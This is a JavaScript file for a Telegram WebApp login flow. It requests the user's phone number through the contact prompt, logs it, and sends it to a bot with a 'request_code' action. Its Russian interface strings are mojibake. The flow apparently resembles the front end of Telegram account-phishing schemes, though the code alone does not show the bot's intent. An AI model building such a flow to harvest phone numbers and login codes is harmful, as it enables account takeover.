const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

let authData = {
    phone: '',
    isProcessing: false
};

function showStep(stepId) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(stepId).classList.add('active');
    
    if (stepId === 'welcome-step') {
        tg.BackButton.hide();
    } else if (stepId === 'phone-confirm-step') {
        tg.BackButton.show();
    } else {
        tg.BackButton.hide();
    }
}

function requestPhoneNumber() {
    if (authData.isProcessing) {
        console.log('â³ Already processing, skipping...');
        return;
    }

    console.log('ðŸ“± Requesting phone number via Telegram...');
    
    tg.requestContact((status, data) => {
        console.log('ðŸ“ž Contact request response:', status, data);
        
        if (status && data.responseUnsafe?.contact?.phone_number) {
            let phone = data.responseUnsafe.contact.phone_number;
            
            if (!phone.startsWith('+')) {
                phone = '+' + phone;
            }
            
            authData.phone = phone;
            document.getElementById('phone-display').textContent = phone;
            showStep('phone-confirm-step');
            console.log('âœ… Phone received:', phone);
        } else {
            tg.showAlert('ÐÐµ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð½Ð¾Ð¼ÐµÑ€ Ñ‚ÐµÐ»ÐµÑ„Ð¾Ð½Ð°');
            console.error('âŒ No phone in response');
        }
    });
}

function submitPhone() {
    if (authData.isProcessing) {
        console.log('â³ Already processing phone submission');
        return;
    }

    if (!authData.phone) {
        tg.showAlert('ÐÐ¾Ð¼ÐµÑ€ Ñ‚ÐµÐ»ÐµÑ„Ð¾Ð½Ð° Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½');
        return;
    }

    console.log('ðŸš€ Submitting phone:', authData.phone);
    authData.isProcessing = true;

    // ÐŸÐ¾ÐºÐ°Ð·Ñ‹Ð²Ð°ÐµÐ¼ Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÑƒ
    showStep('loading-step');
    document.getElementById('loading-title').textContent = 'ÐžÑ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð½Ð¾Ð¼ÐµÑ€Ð°...';
    document.getElementById('loading-text').textContent = 'ÐžÐ¶Ð¸Ð´Ð°Ð½Ð¸Ðµ Ð¾Ñ‚Ð²ÐµÑ‚Ð° Ð¾Ñ‚ Ð±Ð¾Ñ‚Ð°';

    const payload = JSON.stringify({
        action: 'request_code',
        phone: authData.phone
    });

    console.log('ðŸ“¤ Payload:', payload);

    try {
        // ÐžÑ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÐ¼ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð±Ð¾Ñ‚Ñƒ
        tg.sendData(payload);
        console.log('âœ… Data sent, WebApp should close');
        
    } catch (error) {
        console.error('âŒ Error:', error);
        authData.isProcessing = false;
        showError('ÐžÑˆÐ¸Ð±ÐºÐ° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ¸: ' + error.message);
    }
}

function showError(message) {
    authData.isProcessing = false;
    document.getElementById('error-message').textContent = message;
    showStep('error-step');
}

// ÐžÐ±Ñ€Ð°Ð±Ð¾Ñ‚ÐºÐ° ÐºÐ½Ð¾Ð¿ÐºÐ¸ "ÐÐ°Ð·Ð°Ð´"
tg.BackButton.onClick(() => {
    showStep('welcome-step');
    authData.isProcessing = false;
});

// Ð¡ÐºÑ€Ñ‹Ð²Ð°ÐµÐ¼ Ð³Ð»Ð°Ð²Ð½ÑƒÑŽ ÐºÐ½Ð¾Ð¿ÐºÑƒ
tg.MainButton.hide();

console.log('âœ… Telegram WebApp initialized:', {
    version: tg.version,
    platform: tg.platform,
    initData: tg.initData ? 'Present' : 'Missing'
});
